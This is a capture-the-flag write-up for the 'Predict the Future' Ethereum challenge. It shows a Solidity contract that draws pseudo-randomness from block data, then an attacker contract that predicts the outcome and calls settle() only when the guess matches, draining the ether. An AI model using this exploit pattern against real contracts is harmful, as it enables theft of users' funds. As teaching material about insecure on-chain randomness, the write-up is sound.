# Catch the Ether 5: Predict the Future

Random numbers cannot be created inside solidity, oracles are suggested

## The Task Intro

This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

Note that it is indeed possible to solve this challenge without losing any ether.

## The Task Code

```apache
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

## The Solution

This task looks impossible to solve, how should I predict a future block hash, even if there are only values from 0-10 possible, when you can guess only once?

So I studied a while over this problem. In a way it was a problem like the second challange, we never can revert a hash to its original problem with the means I have available. So why not just say hey I guess number 1. And I call only settle if the current block has equals to 1. See the calling contract below.

Done again🎉️.

```apache
contract Crack {
    PredictTheFutureChallenge public ptfc;
    address public owner;

    function Crack(PredictTheFutureChallenge _ptfc) public payable {
        owner = msg.sender;
        ptfc = _ptfc;
        //(new PredictTheFutureChallenge).value(1 ether)();
        //ptfc.lockInGuess.value(1 ether)(1);
    }

    function guess(uint8 n) external {
        ptfc.lockInGuess.value(1 ether)(n);
    }

    function attack() external {
        require(owner == msg.sender);
        if (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10 == uint8(1)) {
            ptfc.settle();
        }
    }

    function payback() external {
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }

    function() public payable {}
}

```
